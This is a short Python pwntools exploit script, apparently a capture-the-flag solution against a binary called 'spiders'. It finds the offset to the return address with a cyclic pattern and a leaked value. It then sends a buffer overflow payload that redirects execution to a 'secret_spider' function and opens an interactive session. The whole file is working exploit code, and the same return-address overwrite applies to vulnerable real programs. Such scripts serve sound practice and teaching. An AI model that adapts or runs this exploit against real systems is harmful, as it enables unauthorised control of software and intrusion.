#!/usr/bin/python3
from pwn import *

# Switch between local/GDB/remote from terminal 
def initIO():
    if (args.REMOTE):   # ("server", port)
        return remote(sys.argv[1], sys.argv[2])
    else:               # Run locally
        return ELF.process()

# Set up the correct architecture for pwn
file = "./spiders"
# Get context arch, bits, os, etc.
ELF = context.binary = ELF(file, checksec=False)
# Enable verbose logging
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = initIO()

# Find offset
io.sendline(cyclic(512))

io.recvuntil(b'0x')

pattern = io.recv(8)
pattern = int(pattern, 16)
pattern = p32(pattern)

offset = cyclic_find(pattern)

# Restart program, send payload
io = initIO()

payload = flat(
    offset * b'A',
    ELF.symbols.secret_spider
)

io.sendline(payload)

io.interactive()
